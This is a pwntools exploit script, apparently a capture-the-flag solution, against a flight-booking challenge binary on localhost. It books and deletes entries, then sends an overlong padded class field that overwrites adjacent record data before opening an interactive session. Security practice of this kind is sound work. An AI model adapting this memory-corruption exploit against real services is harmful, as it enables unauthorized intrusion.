#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 11103 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 11103)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  '.'


io = start()

sla = io.sendlineafter

def book(name,fnum,bclass):
    sla(b"choice: ",b"2")
    sla(b": ",name.encode())
    sla(b"number: ",fnum.encode())
    sla(b": ",bclass.encode())

def delete_book(idx):
    sla(b"choice: ",b"3")
    sla(b": ",idx.encode())

book("test1","FL001","Economic") # 1
book("test2","FL001","Economic") # 2
# book("test3","FL001","Economic")

delete_book("1")

p = 'Economic'.ljust(24,"b")
p += 'a'*8
p += '\x09' + '\x00'*7
p += 'a'*(136)
p += 'Business'
# p += 
book("test3","FL001",p)

sla(b"choice: ",b"1")
sla(b": ",b"9")

io.interactive()

